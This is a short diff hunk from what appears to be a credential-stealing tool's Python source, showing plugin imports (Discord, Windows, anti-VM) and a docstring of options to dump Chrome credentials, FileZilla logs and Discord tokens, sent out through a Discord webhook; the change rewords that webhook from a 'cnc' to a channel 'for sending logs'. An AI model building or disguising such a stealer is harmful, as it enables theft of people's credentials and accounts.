@@ -20,7 +20,7 @@ from plugins.discord import Discord
 from plugins.windows import Windows
 from plugins.antivm import AntiVM
 """
-webhook - The discord webhook which acts like a cnc
+webhook - The discord webhook for sending logs
 chrome - Should it dump chrome credentials
 filezilla - Should it dump filezilla logs
 discord - Dump discord tokens
